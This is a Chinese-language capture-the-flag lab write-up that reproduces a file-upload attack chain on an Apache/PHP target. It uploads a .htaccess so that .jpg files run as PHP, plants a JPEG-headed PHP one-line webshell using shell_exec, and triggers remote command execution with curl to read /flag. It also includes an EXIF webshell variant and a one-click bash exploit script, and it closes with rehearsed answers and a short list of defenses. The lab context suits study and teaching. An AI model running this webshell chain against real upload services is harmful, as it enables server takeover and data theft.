# 第 40 题 · 文件上传组合拳（人话版复现）

> 目标：靠上传功能拿到容器里 `/flag`
> 思路：**传一个配置文件改服务器规则 → 传一张"假图片"里塞代码 → 访问图片触发代码**

---

## 一句话讲清楚原理（背这段就够）

> 开发者只挡了 `.php` 这种危险后缀，**忘了挡 `.htaccess`**。
> `.htaccess` 是 Apache 的配置文件，能让 `.jpg` 也被当成 PHP 执行。
> 所以我先传一个 `.htaccess` 改规则，再传一张"图片"（其实里面是 PHP 代码），访问这张图片就能执行命令读 flag。

**三个漏洞叠加：**

| 防线 | 漏在哪 |
|------|--------|
| ① 后缀黑名单 | 漏了 `.htaccess`（它没有后缀） |
| ② MIME 检查 | 只信请求里的 `Content-Type`，可以伪造 |
| ③ Apache 配置 | 开了 `AllowOverride All`，允许 `.htaccess` 覆盖规则 |

---

## 复现：3 步，复制粘贴就行

先设个变量，把目标地址放进去：

```bash
B=http://目标IP:端口
```

### Step 1 · 传 `.htaccess`：让 `.jpg` 当 PHP 执行

```bash
# 1. 在本地写一个 .htaccess
echo 'AddType application/x-httpd-php .jpg' > ht

# 2. 上传它（关键：filename 改成 .htaccess，type 假装是图片）
curl "$B/" -F "file=@./ht;filename=.htaccess;type=image/jpeg"
```

**这一步在干嘛：**
- 本地文件叫 `ht`，但上传时用 `filename=.htaccess` **改名**，让服务器以为我传的是 `.htaccess`。
- `type=image/jpeg` 假装自己是图片，骗过 MIME 检查。
- `.htaccess` 里那行配置的意思：**"以后这个目录里所有 `.jpg`，都按 PHP 来执行"**。

> 看到返回页面里有 `/uploads/.htaccess` 字样就说明成功了。

---

### Step 2 · 做一张"图片马"：图片外壳 + PHP 内核

**最简单的办法：拿一张真图片，把 PHP 代码贴到尾巴上。**

```bash
# 方法 A：用任意一张真图片（推荐，最像真的）
cp ~/任意一张图片.jpg shell.jpg
echo '<?php echo "FLAG:".shell_exec($_GET["c"]); ?>' >> shell.jpg

# 方法 B：手搓一个最小 JPEG 头（不想找图就用这个）
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > shell.jpg
printf '%s' '<?php echo "FLAG:".shell_exec($_GET["c"]); ?>' >> shell.jpg
```

然后上传：

```bash
curl "$B/" -F "file=@./shell.jpg;type=image/jpeg"
```

**这一步在干嘛：**
- 文件**开头**是合法的 JPEG 字节，所以服务器看它就是图片。
- 文件**结尾**追加了 PHP 代码 `<?php ... ?>`，PHP 引擎只会执行 `<?php ?>` 包起来的部分，前面的图片数据被当成普通输出。
- `shell_exec($_GET["c"])` 的意思：执行 URL 参数 `c` 里传的命令。

> ⚠ **PHP 代码必须用单引号 `'...'` 包住**，不然 bash 会把 `$_GET` 当自己的变量解释成空字符串。

---

### Step 3 · 访问图片，触发 RCE，读 flag

```bash
curl "$B/uploads/shell.jpg?c=cat+/flag"
```

返回里前面是一堆乱码（图片头的二进制），后面会有：

```
FLAG:TOGOGO-flag{xxxxxxxxxxxx}
```

**这一步在干嘛：**
- 浏览器访问 `shell.jpg` 时，Apache 看了 `.htaccess` 配置 → 把 `.jpg` 交给 PHP 处理。
- PHP 执行了文件里的 `<?php ?>` 代码块。
- 我们用 `?c=cat+/flag` 让它执行 `cat /flag`，flag 被打印出来。

乱码太多看不清的话，用 `strings` 过滤一下：

```bash
curl -s "$B/uploads/shell.jpg?c=cat+/flag" | strings | grep FLAG
```

## 那些"看起来很难"的东西从哪来的？

| 看起来很专业的东西 | 真相 |
|---|---|
| `\xff\xd8\xff\xe0...JFIF...` | JPEG 文件的"标准开头"，全网随便搜 "JFIF magic bytes" 都有，**没人背** |
| `AddType application/x-httpd-php .jpg` | Apache 官方文档里就有，记不住就搜 ".htaccess 让 jpg 当 php" |
| `curl -F "file=@xx;filename=xx;type=xx"` | `curl` 文件上传的固定语法，`man curl` 翻到 `-F` 段就有 |
| `<?php shell_exec($_GET["c"]); ?>` | PHP 一句话木马，是这个圈子的"Hello World" |

**实战里你只需要记住"思路"，命令复制就行。**

## 怎么编辑/查看这些文件？

- **看字节**：VS Code 装个 "Hex Editor" 插件，右键 jpg → "Open With Hex Editor"，所见即所得。
- **编辑文本部分**：`.htaccess`、PHP 代码都是纯文本，VS Code 直接打开就能改。
- **图片马更"真"的做法**：用 `exiftool` 把 PHP 写进 EXIF 注释字段里：
  ```bash
  exiftool -Comment='<?php system($_GET["c"]);?>' cat.jpg
  ```

## 老师可能问你的（背好回答）

**Q1：你怎么绕过的扩展名黑名单？**
> 我没传 `.php`，我传的是 `.htaccess`。它没有扩展名，黑名单匹配不到。

**Q2：`.htaccess` 是干嘛的？**
> Apache 的目录级配置文件。我在里面写 `AddType application/x-httpd-php .jpg`，告诉 Apache 把 `.jpg` 当 PHP 解析。这样我再传一个 `.jpg`，里面塞 PHP 代码，访问时就会被执行。

**Q3：MIME 检查怎么过的？**
> 服务端只看 HTTP 请求里的 `Content-Type` 字段，这个字段完全由我控制。我用 `curl -F` 的 `type=image/jpeg` 把它伪造成图片就行。

**Q4：图片马的原理？**
> 一个文件同时满足两个身份：开头是合法 JPEG 字节，所以图片类型检测能通过；结尾追加了 `<?php ?>` 代码块，PHP 引擎只解析 `<?php ?>` 之间的内容。所以看是图片，执行是 webshell。

**Q5：怎么防御？**
> 三层：
> 1. **代码层**：用白名单代替黑名单；服务端用 `finfo_file()` 读文件真实类型；上传后强制重命名。
> 2. **配置层**：Apache 关掉 `AllowOverride`，上传目录关掉 PHP 执行。
> 3. **架构层**：上传文件存到非 Web 目录，通过下载接口输出。

## 一键复现脚本（保命用）

```bash
#!/bin/bash
B=http://目标IP:端口

# Step 1
echo 'AddType application/x-httpd-php .jpg' > ht
curl -s "$B/" -F "file=@./ht;filename=.htaccess;type=image/jpeg" >/dev/null

# Step 2
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > shell.jpg
printf '%s' '<?php echo "FLAG:".shell_exec($_GET["c"]); ?>' >> shell.jpg
curl -s "$B/" -F "file=@./shell.jpg;type=image/jpeg" >/dev/null

# Step 3
curl -s "$B/uploads/shell.jpg?c=cat+/flag" | strings | grep FLAG
```
